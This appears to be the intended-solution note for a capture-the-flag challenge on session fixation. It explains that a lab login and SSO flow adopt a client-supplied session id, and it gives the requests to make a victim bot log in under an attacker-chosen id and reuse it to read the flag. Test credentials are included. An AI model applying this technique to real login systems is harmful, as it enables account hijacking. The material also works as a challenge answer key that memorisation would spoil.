# AUTH / SessionFixation — Anchor ID

Bug: the login flow **adopts a client-supplied session id**. `POST /login`
(and the SSO bridge) accept an optional `sid` — if no session exists under it
yet, the authenticated session is created *with that id* (pre-authentication
fixation).

Why exploitable: you choose the session id **before** the victim authenticates;
their login binds your id, and you simply resume riding it afterwards.

Intended path:
1. Pick a fixation value, e.g. `sid=fix-4c1d2e3f`.
2. Have the victim (innocent) log in via SSO, adopting your sid — victim bot:
   `POST http://collector.target.lab:8119/victim` with body
   `{"url":"http://victim.target.lab:8119/__sso","method":"POST","body":{"sid":"fix-4c1d2e3f"}}`
3. Use the fixated id yourself: request `GET /flag` with cookie
   `sid=fix-4c1d2e3f` → `DSLTV{AUTH-SessionFixation-<n>}` (server checks the
   session belongs to the innocent account).

Sanity check: `POST /login {"username":"0xnhsec","password":"vlh-tester-01","sid":"myfix"}` demonstrates the adoption flaw on your own account first.

Flag format: `DSLTV{AUTH-SessionFixation-<digits>}` — regenerated at every boot.
